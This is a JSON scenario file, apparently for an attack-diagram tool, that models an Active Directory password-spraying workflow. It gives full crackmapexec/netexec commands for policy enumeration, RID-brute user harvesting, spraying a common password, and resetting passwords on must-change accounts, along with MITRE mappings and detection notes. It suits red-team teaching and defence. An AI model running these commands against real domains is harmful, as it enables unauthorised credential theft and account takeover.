@@ -1,0 +1,293 @@
+{
+  "title": "AD Domain Password Spray Workflow (CME/NetExec/Kerbrute)",
+  "description": "Lockout-aware AD password spraying pipeline that enumerates policy/users, performs controlled spray attempts, and validates recovered access paths.",
+  "version": "3.0",
+  "viewport": {
+    "zoom": 1.09,
+    "pan": {
+      "x": 500.7916217204322,
+      "y": 339.79415687790697
+    }
+  },
+  "edgeCurveScale": 164,
+  "attackMatrixOpen": false,
+  "sizeControlsOpen": false,
+  "shortDescription": "AD Password Spray Workflow",
+  "tags": [
+    "password-cracking",
+    "active-directory",
+    "password-spraying",
+    "netexec",
+    "credential-access"
+  ],
+  "metadata": {
+    "descriptionHtml": "<p>This scenario models an operator-driven Active Directory spray workflow using <span style='color:#ef4444;font-weight:bold;'>crackmapexec</span>, <span style='color:#ef4444;font-weight:bold;'>netexec</span>, and <span style='color:#ef4444;font-weight:bold;'>kerbrute</span>. It emphasizes policy-aware pacing, user-list preparation, and controlled handling of edge states such as <code>STATUS_PASSWORD_MUST_CHANGE</code>.</p>",
+    "commandsBlock": "# Step 1: Enumerate password policy\n$ crackmapexec <IP> -u 'user' -p 'password' --pass-pol\n\n# Step 2: Build user list\n$ netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'| ' '/SidTypeUser/ {print $3}' > users.txt\n\n# Step 3: Perform lockout-aware spray\n$ netexec smb <DC_FQDN> -u users.txt -p 'Password123!' --continue-on-success --no-bruteforce --shares\n\n# Step 4: Validate recovered credentials\n$ netexec smb <DC.FQDN> -u <User> -p '<RecoveredPass>' --pass-pol\n\n# Optional branch: handle STATUS_PASSWORD_MUST_CHANGE\n$ env NEWPASS='P@ssw0rd!2025#' ; netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS='$NEWPASS'",
+    "prerequisites": [
+      "Reachability to AD services (TCP 445/88)",
+      "Authorized assessment scope and domain context",
+      "Lockout policy awareness before authentication testing"
+    ],
+    "attackerGains": [
+      "Validated domain credentials",
+      "Account state intelligence for follow-on access testing"
+    ],
+    "detectionNotes": [
+      "Alert on distributed failed-auth spikes across many usernames",
+      "Enforce smart lockout and MFA/Conditional Access",
+      "Monitor unusual SMB/Kerberos authentication source patterns"
+    ],
+    "mitreCategories": [
+      "T1201",
+      "T1087.002",
+      "T1110.003",
+      "T1098",
+      "T1078"
+    ],
+    "extraInfo": [
+      "CrackMapExec/NetExec documentation",
+      "Kerbrute userenum/passwordspray workflows"
+    ]
+  },
+  "entities": [
+    {
+      "id": "attacker_environment",
+      "label": "Attacker Environment",
+      "position": {
+        "x": -126.70891870049914,
+        "y": 132.7051470365262
+      },
+      "icon": "IconKali",
+      "type": "container",
+      "members": [
+        "operator_node",
+        "spray_engine",
+        "user_enumeration_set",
+        "validated_credentials"
+      ]
+    },
+    {
+      "id": "ad_core",
+      "label": "AD Core Services",
+      "position": {
+        "x": 457.81786618033357,
+        "y": 33.68964422190204
+      },
+      "icon": "IconActiveDirectory",
+      "type": "container",
+      "members": [
+        "domain_controller",
+        "domain_user_set",
+        "auth_result_stream"
+      ]
+    },
+    {
+      "id": "operator_node",
+      "label": "Operator Workstation",
+      "position": {
+        "x": -263.9947802635911,
+        "y": 190.7527039422913
+      },
+      "icon": "IconKali",
+      "type": "node"
+    },
+    {
+      "id": "spray_engine",
+      "label": "Spray Engine (CME/NetExec/Kerbrute)",
+      "position": {
+        "x": 1.5769428625928477,
+        "y": 49.65759013076111
+      },
+      "icon": "IconPenetrationTool",
+      "type": "node"
+    },
+    {
+      "id": "user_enumeration_set",
+      "label": "Candidate User List (users.txt)",
+      "position": {
+        "x": -75.00282707933756,
+        "y": -178.0914392111276
+      },
+      "icon": "IconData",
+      "type": "node"
+    },
+    {
+      "id": "validated_credentials",
+      "label": "Validated Domain Credentials",
+      "position": {
+        "x": 18.12394946357888,
+        "y": -53.162521319034624
+      },
+      "icon": "IconStolenCredential",
+      "type": "node"
+    },
+    {
+      "id": "domain_controller",
+      "label": "Domain Controller",
+      "position": {
+        "x": 397.8023048217167,
+        "y": 142.54765647243138
+      },
+      "icon": "IconDC",
+      "type": "node"
+    },
+    {
+      "id": "domain_user_set",
+      "label": "Domain User Accounts",
+      "position": {
+        "x": 504.8334275389504,
+        "y": -100.1683680286273
+      },
+      "icon": "IconUser",
+      "type": "node"
+    },
+    {
+      "id": "auth_result_stream",
+      "label": "Auth Result Stream",
+      "position": {
+        "x": 341.24163887136166,
+        "y": -20.429495776831867
+      },
+      "icon": "IconCredential",
+      "type": "node"
+    }
+  ],
+  "visibility": {
+    "attacker_environment": {
+      "start": 0,
+      "end": 100
+    },
+    "ad_core": {
+      "start": 0,
+      "end": 100
+    },
+    "operator_node": {
+      "start": 0,
+      "end": 100
+    },
+    "spray_engine": {
+      "start": 0,
+      "end": 100
+    },
+    "domain_controller": {
+      "start": 0,
+      "end": 100
+    },
+    "domain_user_set": {
+      "start": 0,
+      "end": 100
+    },
+    "user_enumeration_set": {
+      "start": 2,
+      "end": 100
+    },
+    "auth_result_stream": {
+      "start": 4,
+      "end": 100
+    },
+    "validated_credentials": {
+      "start": 5,
+      "end": 100
+    }
+  },
+  "steps": [
+    {
+      "id": 1,
+      "type": "edge",
+      "name": "Enumerate Password Policy",
+      "from": "domain_controller",
+      "to": "operator_node",
+      "icon": "IconSearch",
+      "cli": "crackmapexec <IP> -u 'user' -p 'password' --pass-pol",
+      "description": "Query lockout and password policy parameters before any broad authentication activity.",
+      "mitre": {
+        "id": "T1201",
+        "tactic": "Discovery",
+        "technique": "Password Policy Discovery"
+      }
+    },
+    {
+      "id": 2,
+      "type": "edge",
+      "name": "Build Candidate Username Set",
+      "from": "domain_user_set",
+      "to": "user_enumeration_set",
+      "icon": "IconData",
+      "cli": "netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'| ' '/SidTypeUser/ {print $3}' > users.txt",
+      "description": "RID brute and related checks derive likely valid domain usernames for controlled spray testing.",
+      "mitre": {
+        "id": "T1087.002",
+        "tactic": "Discovery",
+        "technique": "Domain Account"
+      }
+    },
+    {
+      "id": 3,
+      "type": "edge",
+      "name": "Execute Lockout-Aware Spray",
+      "from": "spray_engine",
+      "to": "domain_controller",
+      "icon": "IconExploit",
+      "cli": "netexec smb <DC_FQDN> -u users.txt -p 'Password123!' --continue-on-success --no-bruteforce --shares",
+      "description": "Test a constrained password set across many users with anti-lockout controls.",
+      "mitre": {
+        "id": "T1110.003",
+        "tactic": "Credential Access",
+        "technique": "Password Spraying"
+      }
+    },
+    {
+      "id": 4,
+      "type": "edge",
+      "name": "Receive Authentication Outcomes",
+      "from": "domain_controller",
+      "to": "auth_result_stream",
+      "icon": "IconCredential",
+      "description": "Domain controller returns success/failure and account-state results from spray attempts.",
+      "mitre": {
+        "id": "T1110.003",
+        "tactic": "Credential Access",
+        "technique": "Password Spraying"
+      }
+    },
+    {
+      "id": 5,
+      "type": "edge",
+      "name": "Consolidate Valid Credentials",
+      "from": "auth_result_stream",
+      "to": "validated_credentials",
+      "icon": "IconStolenCredential",
+      "cli": "netexec smb <DC.FQDN> -u <User> -p '<RecoveredPass>' --pass-pol",
+      "description": "Consolidate successful authentication outcomes into a validated credential set for authorized follow-on testing.",
+      "mitre": {
+        "id": "T1078",
+        "tactic": "Initial Access",
+        "technique": "Valid Accounts"
+      }
+    },
+    {
+      "id": 6,
+      "type": "edge",
+      "name": "Optional Must-Change-Password Branch",
+      "from": "operator_node",
+      "to": "domain_controller",
+      "icon": "IconProcess",
+      "cli": "env NEWPASS='P@ssw0rd!2025#' ; netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS='$NEWPASS'",
+      "description": "Optional branch: for eligible STATUS_PASSWORD_MUST_CHANGE accounts, set a known password and re-validate access.",
+      "mitre": {
+        "id": "T1098",
+        "tactic": "Persistence",
+        "technique": "Account Manipulation"
+      }
+    },
+    {
+      "id": 7,
+      "type": "edge",
+      "name": "Return Results to Operator",
+      "from": "validated_credentials",
+      "to": "operator_node",
+      "icon": "IconCheck",
+      "description": "Verified credentials and account-state findings are returned to the operator for controlled next actions."
+    }
+  ]
+}
